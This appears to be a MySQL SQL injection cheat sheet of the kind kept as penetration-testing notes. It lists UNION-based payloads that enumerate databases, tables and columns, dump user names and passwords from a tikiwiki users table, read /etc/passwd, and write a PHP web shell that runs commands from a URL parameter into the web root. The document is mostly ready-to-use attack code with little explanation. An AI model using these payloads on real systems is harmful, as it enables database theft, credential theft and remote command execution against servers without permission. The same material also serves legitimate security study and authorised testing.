# SQLi

## Get general info about tables and columns

The information_schema
view contains metadata about the objects within a database such as the name of a database or table,
the data type of a column, or access privileges.The result set contains a long list of tables (including the name of the database that contains the
table). The next step is to display all the columns for the tables.

```sql
0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables #
```

### Retrieve additional DB infos


```
@@hostname : Current Hostname
@@tmpdir : Tept Directory
@@datadir : Data Directory
@@version : Version of DB
@@basedir : Base Directory
user() : Current User
database() : Current Database
version() : Version
schema() : current Database
UUID() : System UUID key
current_user() : Current User
```

## List all DBs

```sql
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
```
___

## List all Tables in DB "test"

```sql
SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='test' ;-- -
```
___

## Get columns for certain table with CONCAT

At this point we have a logn list of tables
The concat() function used in this input returns the table_name, a semicolon (represented by ASCII
character 58) and the column_name in one field.

```sql
0' or 0=0 UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
```

___

## Display contents of the table

Now we that we found out the table and column names we can show the data.

```sql
0' or 0=0 UNION SELECT user, password from tikiwiki195.tiki_users #
```

___

## Interact with the Filesystem

MySQL has several functions that we can use to read and
write files on the local file system. In the following sections we will have a look at the LOAD_FILE
function to read local files and the OUTFILE function to write files to the local file system, such as a
web shell.

### Read local files

```sql
0 'UNION SELECT 1, load_file('/etc/passwd') #
```

### Write file to server

```sql
0' UNION SELECT '<?php phpinfo();?>', null INTO OUTFILE '/var/www/info.php' #
0' UNION SELECT '<?php echo shell_exec($_GET[\'cmd\']); ?>', null INTO OUTFILE '/var/www/cmd.php' #
```

___
